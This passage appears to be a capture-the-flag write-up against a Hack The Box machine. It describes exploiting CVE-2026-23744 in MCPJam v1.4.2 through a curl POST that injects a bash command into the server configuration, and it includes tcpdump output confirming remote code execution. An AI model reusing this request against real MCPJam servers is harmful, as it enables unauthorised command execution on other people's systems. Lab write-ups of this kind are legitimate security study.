It uses [MCPJam](https://www.mcpjam.com/)

The version is: `v1.4.2`

Has Ollama as an AI fro LLM that is connected internally via the following url `http://127.0.0.1:11434/api`

### CVE-2026-23744
There is an existing RCE on this webpage. Following this [POC](https://github.com/boroeurnprach/CVE-2026-23744-PoC) I was able to send a curl command that have sent an ICMP Packet to my VM.
```Shell
curl -X POST https://mcp.kobold.htb/api/mcp/connect -d '{"serverConfig":{"command":"bash", "args":["-c","ping -c 1 10.10.14.201"], "env":{"DISPLAY":":0"}},"serverId":"rce_test"}' -k
{"success":false,"error":"Connection failed for server rce_test: MCP error -32000: Connection closed","details":"MCP error -32000: Connection closed"}%  
```

```Shell
tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:54:45.114661 IP kobold.htb > HackArch: ICMP echo request, id 2600, seq 1, length 64
21:54:45.114673 IP HackArch > kobold.htb: ICMP echo reply, id 2600, seq 1, length 64
```
